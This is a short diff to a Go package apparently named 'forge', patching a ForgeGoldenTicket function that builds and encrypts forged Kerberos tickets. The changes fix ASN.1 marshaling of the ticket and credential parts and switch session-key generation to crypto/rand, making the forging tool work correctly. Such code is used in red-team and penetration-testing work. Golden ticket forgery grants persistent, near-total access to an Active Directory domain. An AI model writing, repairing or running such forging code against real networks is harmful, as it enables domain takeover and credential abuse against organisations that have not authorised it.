@@ -1,6 +1,7 @@
 package forge
 
 import (
+	cryptoRand "crypto/rand"
 	"encoding/asn1"
 	"fmt"
 	"time"
@@ -124,7 +125,7 @@ func ForgeGoldenTicket(req *GoldenTicketRequest) (*GoldenTicketResult, error) {
 	encTicketPart := buildEncTicketPart(req, sessionKey, pacData)
 
 	// Encrypt ticket part
-	encTicketPartBytes, err := asn1.MarshalWithParams(encTicketPart, "application,tag:3")
+	encTicketPartBytes, err := asn1.MarshalWithParams(*encTicketPart, "application,tag:3")
 	if err != nil {
 		return nil, fmt.Errorf("failed to marshal enc-ticket-part: %w", err)
 	}
@@ -176,7 +177,7 @@ func ForgeGoldenTicket(req *GoldenTicketRequest) (*GoldenTicketResult, error) {
 		},
 	}
 
-	credInfoBytes, err := asn1.MarshalWithParams(credInfo, "application,tag:29")
+	credInfoBytes, err := asn1.MarshalWithParams(*credInfo, "application,tag:29")
 	if err != nil {
 		return nil, fmt.Errorf("failed to marshal cred info: %w", err)
 	}
@@ -341,7 +342,7 @@ func generateSessionKey(etype int32) []byte {
 
 func randomBytes(n int) []byte {
 	b := make([]byte, n)
-	// Use crypto/rand in production
+	cryptoRand.Read(b)
 	return b
 }
 
